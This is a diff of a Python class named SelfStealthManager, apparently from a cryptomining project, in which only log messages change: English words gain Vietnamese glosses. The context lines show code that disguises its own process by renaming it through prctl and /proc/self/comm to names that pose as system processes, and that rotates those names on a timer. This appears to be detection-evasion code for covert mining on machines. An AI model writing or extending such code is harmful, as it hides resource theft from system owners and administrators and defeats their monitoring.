@@ -53,7 +53,7 @@ class SelfStealthManager:
             rotation_interval: Thời gian giữa các lần đổi tên (giây)
         """
         self.logger = get_unified_logger('mining_environment.cpu_stealth')
-        self.logger.info("🔒 [SELF-STEALTH] Initializing Self-Stealth Manager")
+        self.logger.info("🔒 [SELF-STEALTH] Initializing Self-Stealth **[manager]** (trình quản lý)")
         
         # **[Default Stealth Names]** (tên ẩn danh mặc định) - giả làm system processes
         self.default_names = [
@@ -100,7 +100,7 @@ class SelfStealthManager:
             with open("/proc/self/comm", "r") as f:
                 return f.read().strip()
         except Exception as e:
-            self.logger.error(f"❌ [SELF-STEALTH] Cannot read current process name: {e}")
+            self.logger.error(f"❌ [SELF-STEALTH] Cannot read current **[process]** (tiến trình) name: {e}")
             return "unknown"
     
     def set_process_name_prctl(self, name: str) -> bool:
@@ -126,7 +126,7 @@ class SelfStealthManager:
             result = self.libc.prctl(self.PR_SET_NAME, name_bytes)
             
             if result == 0:
-                self.logger.info(f"✅ [SELF-STEALTH] Process name changed to: '{truncated_name}'")
+                self.logger.info(f"✅ [SELF-STEALTH] **[process]** (tiến trình) name changed to: '{truncated_name}'")
                 return True
             else:
                 self.logger.error(f"❌ [SELF-STEALTH] prctl failed with code: {result}")
@@ -151,7 +151,7 @@ class SelfStealthManager:
             with open("/proc/self/comm", "w") as f:
                 f.write(truncated_name)
             
-            self.logger.info(f"✅ [SELF-STEALTH] Process name changed via /proc/self/comm to: '{truncated_name}'")
+            self.logger.info(f"✅ [SELF-STEALTH] **[process]** (tiến trình) name changed via /proc/self/comm to: '{truncated_name}'")
             return True
             
         except Exception as e:
@@ -178,7 +178,7 @@ class SelfStealthManager:
             self.current_stealth_name = name
             return True
             
-        self.logger.error(f"❌ [SELF-STEALTH] All methods failed to change process name to: {name}")
+        self.logger.error(f"❌ [SELF-STEALTH] All methods failed to change **[process]** (tiến trình) name to: {name}")
         return False
     
     def start_stealth_mode(self) -> bool:
@@ -194,7 +194,7 @@ class SelfStealthManager:
         
         # Lưu tên gốc
         self.original_name = self.get_current_process_name()
-        self.logger.info(f"🔍 [SELF-STEALTH] Original process name: '{self.original_name}'")
+        self.logger.info(f"🔍 [SELF-STEALTH] Original **[process]** (tiến trình) name: '{self.original_name}'")
         
         # Thay đổi tên lần đầu
         initial_name = random.choice(self.target_names)
@@ -237,7 +237,7 @@ class SelfStealthManager:
         if self.original_name:
             success = self.change_process_name(self.original_name)
             if success:
-                self.logger.info(f"✅ [SELF-STEALTH] Process name restored to: '{self.original_name}'")
+                self.logger.info(f"✅ [SELF-STEALTH] **[process]** (tiến trình) name restored to: '{self.original_name}'")
             else:
                 self.logger.warning(f"⚠️ [SELF-STEALTH] Failed to restore original name: '{self.original_name}'")
             return success
@@ -264,7 +264,7 @@ class SelfStealthManager:
                     self.logger.debug(f"🔄 [SELF-STEALTH] Rotated to: '{new_name}'")
                 
             except Exception as e:
-                self.logger.error(f"❌ [SELF-STEALTH] Error during name rotation: {e}")
+                self.logger.error(f"❌ [SELF-STEALTH] **[error]** (lỗi) during name rotation: {e}")
         
         self.logger.info("🔚 [SELF-STEALTH] Name rotation worker stopped")
     
